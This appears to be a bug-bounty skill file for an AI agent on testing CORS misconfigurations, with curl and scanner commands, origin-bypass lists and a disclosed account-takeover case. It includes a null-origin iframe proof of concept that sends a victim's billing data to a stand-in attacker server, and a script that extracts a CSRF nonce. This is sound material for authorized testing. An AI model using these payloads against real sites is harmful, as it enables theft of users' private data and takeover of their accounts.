---
name: cors-misconfig-testing
description: CORS (Cross-Origin Resource Sharing) misconfiguration testing — probing Access-Control-Allow-Origin/Access-Control-Allow-Credentials headers by sending arbitrary/attacker-controlled Origin headers and checking whether the server reflects them (especially combined with allow-credentials:true), which lets any attacker-hosted page read authenticated API responses cross-origin. Use this during Phase 3 (Vulnerability Testing — Access control/Client-side) of bughunting-workflow on any API endpoint reachable from a browser, especially ones returning session/PII data. Also trigger on mentions of CORS, Access-Control-Allow-Origin, Access-Control-Allow-Credentials, or origin reflection.
---

# CORS Misconfiguration Testing

Command-reference library for CORS testing. Add new entries as new bypass patterns (null-origin, subdomain-wildcard-regex bugs, pre-flight quirks) get validated from future writeups.

## Core theory

A CORS misconfiguration is dangerous specifically when **both** of these are true on the same response:
- `Access-Control-Allow-Origin` reflects or otherwise allows an attacker-chosen origin (rather than a fixed allowlist), and
- `Access-Control-Allow-Credentials: true` is also set.

That combination means an attacker's page, when a victim visits it while authenticated to the target, can make a credentialed cross-origin request and **read the response** (not just fire-and-forget it, as with CSRF) — full read access to whatever that authenticated endpoint returns, from any origin. `Access-Control-Allow-Origin: *` alone (without credentials) is far lower severity — it makes public, non-authenticated data cross-origin-readable, which is often intentional.

## Recorded technique: CORS command reference
Source: [Recon to Master: The Complete Bug Bounty Checklist](https://infosecwriteups.com/recon-to-master-the-complete-bug-bounty-checklist-95b80ea55ff0)

### Manual curl inspection
```bash
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ \
  | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"
```
Send a clearly foreign `Origin` header (not the real domain, not a subdomain) and check whether it's reflected back verbatim in `Access-Control-Allow-Origin` — that reflection, especially paired with `Access-Control-Allow-Credentials: true`, is the vulnerable signature.

### Automated scanning
```bash
cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
cat domains.txt | nuclei -t cors.yaml
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
python3 CORScanner.py -u https://example.com -d -t 10
```
(`cors.yaml` — a specific single-template variant worth keeping alongside the broader `vulnerabilities/cors/` directory scan above; source: a curated private template collection at `https://github.com/coffinxp/nuclei-templates`, also referenced for several other templates recorded in `recon-scanning-toolkit`.)
Corsy and CORScanner both sweep a target for the vulnerable reflect+credentials pattern across many endpoints/subdomains at once rather than testing one `curl` at a time — run these first to triage which hosts deserve a manual follow-up.

### What to try beyond plain origin reflection
- A completely unrelated origin (`http://evil.com`) — the baseline test.
- A subdomain of the target that you don't control but could register/take over (`http://random-unclaimed.target.com`) — some configs trust `*.target.com` too broadly.
- `null` origin — some configs special-case `null` (produced by sandboxed iframes, `file://` pages, or certain redirect chains) as allowed, which is exploitable from any sandboxed-iframe attacker page.
- A crafted origin that merely *contains* the real domain as a substring (`http://target.com.evil.com`, `http://eviltarget.com`) — regex-based origin validators are frequently too permissive here.

## Recorded technique: wildcard-subdomain origin trust → CSRF-nonce theft → admin account takeover
Source: [HackerOne report #3930102](https://hackerone.com/reports/3930102) — disclosed report against Myndr, CVSS 7.5 (High), resolved/no bounty listed

**Where:** `admin.myndr.net` (and any admin/internal panel that trusts `*.company-domain.com` as a whole rather than an explicit origin allowlist) — the vulnerable pattern is a CORS policy that says "any subdomain of us is safe" instead of "these specific origins are safe."

**Root cause:** the server reflected *any* `*.myndr.net` origin back in `Access-Control-Allow-Origin` alongside `Access-Control-Allow-Credentials: true` — including origins the site owner doesn't fully control the content of (test/staging/marketing subdomains, or any subdomain reachable via XSS or subdomain takeover). With 20+ live subdomains on the apex, any one of them becoming attacker-controlled (via its own XSS, a takeover, or a compromised deploy) is enough to attack the admin panel, even though the admin panel itself was never directly vulnerable.

**Exploit steps:**
1. Confirm arbitrary-subdomain reflection with credentials — send a `*.target.com` origin you don't even need to control yet, just to confirm the pattern:
   ```
   GET / HTTP/1.1
   Host: admin.myndr.net
   Origin: https://evil.myndr.net
   ```
   Response confirming the bug:
   ```
   access-control-allow-origin: https://evil.myndr.net
   access-control-allow-credentials: true
   vary: Origin
   ```
2. Confirm the credentialed cross-origin read actually yields sensitive content — here, a CSRF nonce sitting in the admin login form's HTML:
   ```javascript
   fetch("https://admin.myndr.net/auth/login-admin", {credentials: "include"})
     .then(r => r.text())
     .then(html => {
       const nonce = html.match(/name="nonce" value="([^"]+)"/)[1];
       // attacker now has a valid CSRF nonce for the victim's authenticated session
     });
   ```
3. **Also test the HTTP-downgrade variant** — send the *same* host as the Origin but over plain HTTP instead of HTTPS; a config that correctly restricts to "the real origin" can still be wrong about scheme:
   ```
   GET / HTTP/1.1
   Host: admin.myndr.net
   Origin: http://admin.myndr.net
   ```
   If the response reflects `access-control-allow-origin: http://admin.myndr.net` with credentials, session cookies become interceptable over a plaintext MITM position too — a second, independent finding worth its own line in the report even on a target that's otherwise "only" vulnerable to the subdomain-wildcard issue.
4. **Chain to impact**: with a stolen CSRF nonce in hand, submit a CSRF request as the victim (change admin password / create a new admin account) → full admin account takeover. This is why CORS-reflects-credentials is rated well above a bare info-disclosure finding whenever the readable response contains *anything* usable to forge a subsequent state-changing request (CSRF token, session identifier, API key) — the CORS bug is the read primitive, CSRF is the write primitive, and together they're full account takeover.

**Impact framing for report:** CVSS 7.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) was justified on confidentiality impact alone (nonce/session-data disclosure); the report explicitly walked the chain to admin account takeover to justify High severity rather than stopping at "CORS misconfigured." State the attacker precondition honestly — here it's "attacker can host content on *any* one of 20+ subdomains," which is a real but non-trivial bar (needs its own XSS/takeover on a sibling subdomain first) — the triager initially marked this "Needs more info" until that precondition and a working PoC were both made explicit, so don't skip stating exactly how an attacker gets into a position to use the bug.

**Generalize beyond this report:** treat "trusts `*.yourdomain.com`" as a distinct, higher-priority test case beyond the existing "unclaimed subdomain you could register/take over" bullet above — a wildcard-subdomain trust policy is exploitable via *any* subdomain compromise (XSS on a marketing site, a forgotten staging deploy, a takeover), not just ones you personally control. Always pair the origin-reflection test with a check for *what's actually readable* in the credentialed response (look specifically for CSRF tokens/nonces, session identifiers, or API keys sitting in the HTML/JSON) — that's what turns a medium info-disclosure CORS finding into a full account-takeover chain, and it's the difference a triager will ask about before accepting the report.

## Recorded technique: null-origin PoC template, character-based regex-bypass catalog, and SSRF-via-CORS escalation
Source: [Exploiting CORS Misconfiguration Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)

**Where:** any target already confirmed (or suspected) to reflect an arbitrary/regex-validated `Origin` with `Access-Control-Allow-Credentials: true` — this entry supplies the actual weaponized PoC templates and an escalation path beyond plain data-read for the patterns entry #1 above already identifies conceptually.

**Ready-to-use `null`-origin exploitation PoC** (a sandboxed iframe's `srcdoc` content runs in a unique, un-attributable context — the browser sends `Origin: null` for it, which some configs special-case as trusted):
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://api.example.com/api/account/billing', {
        credentials: 'include'
    }).then(async (data) => {
        fetch('http://attacker-server/collector?data=' +
              btoa(await data.text()));
    });
  </script>
">
</iframe>
```
Host this on any page and get a victim to visit it while authenticated to the target — no attacker-controlled domain/subdomain is even needed for this specific variant, since the sandboxed iframe manufactures the trusted `null` value itself.

**Character-based regex-bypass catalog** — beyond the substring tricks already in this skill (`target.com.evil.com`), specific single-character insertions that defeat naive regex validators differently per browser, worth trying as a set rather than assuming one bypass style covers all browsers a bug bounty program's user base might use:
```
https://example.comattacker.com        # bare concatenation, no separator
https://example.com.attacker.com       # dot-separator subdomain-style
https://example.computer                # the classic ".com" + "puter" TLD-adjacent trick
https://attacker.comexample.com        # reversed concatenation order
https://localhostexample.com           # trusted-keyword-as-substring trick
https://subdomain-takeover.example.com # combine with an actual subdomain-takeover candidate
```
**Browser-specific parsing-quirk characters** — worth a dedicated pass since a regex that safely rejects the above might still mishandle these:
- **Safari**: a backtick (`` ` ``) character embedded in the origin string.
- **Chrome/Firefox**: `%` and `@` characters placed in the origin's URL-fragment-like position.
Test both sets since a target's actual exploitability can differ by which browser a triager/victim uses to reproduce — note in the report which browser(s) the working PoC was confirmed against.

**SSRF-via-CORS escalation** — a distinct impact path beyond straightforward authenticated-data-read: if the CORS-misconfigured endpoint itself proxies/fetches from an *internal-only* resource (an admin API, an internal service not directly internet-reachable) and returns that content in its response, a victim's browser becomes the bridge — the victim's authenticated request reads the internal resource (which the victim's network position can reach but the attacker's can't), and the CORS misconfiguration is what lets the attacker's page *read that response back* and forward it to attacker infrastructure. This effectively achieves SSRF's internal-network-reach impact without needing a traditional url=-parameter SSRF primitive at all — cross-reference `ssrf-testing` for the general internal-reconnaissance value once this chain is confirmed, but note the delivery mechanism here is entirely different (browser+CORS, not a server-side fetch).

**Severity tiering to apply consistently:**
- **High** — credentialed CORS reflection on a sensitive authenticated endpoint (PII, account/billing data, tokens).
- **Medium** — data accessible without credentials, or requiring meaningful victim interaction to trigger.
- **Low** — wildcard origin (`*`) with no credentials — browsers block the wildcard+credentials combination outright, so this pairing is non-exploitable for credentialed reads and should be flagged as such if a report claims otherwise.

**Generalize note:** the null-origin PoC template and the browser-specific character catalog both slot directly into this skill's existing "what to try beyond plain origin reflection" checklist — run them as additional rows in that same sweep rather than a separate pass. The SSRF-escalation angle is the one genuinely new *impact* category this entry adds on top of entry #1's CSRF-nonce-theft escalation — always ask "does this endpoint's response contain anything read from somewhere the attacker themselves couldn't otherwise reach" (an internal resource, a CSRF token, a session identifier) before capping a CORS finding at plain info-disclosure severity.

## Impact framing for report

Always confirm `Access-Control-Allow-Credentials: true` is present before claiming high severity — without it, browsers won't send cookies on the credentialed request regardless of what `Allow-Origin` says, so the practical impact is much lower. With both present, frame the report around the specific sensitive endpoint you could read cross-origin (session data, PII, tokens) with a working PoC page, not just "CORS misconfigured."

<!-- Add new recorded techniques below this line as new CORS writeups are processed. -->
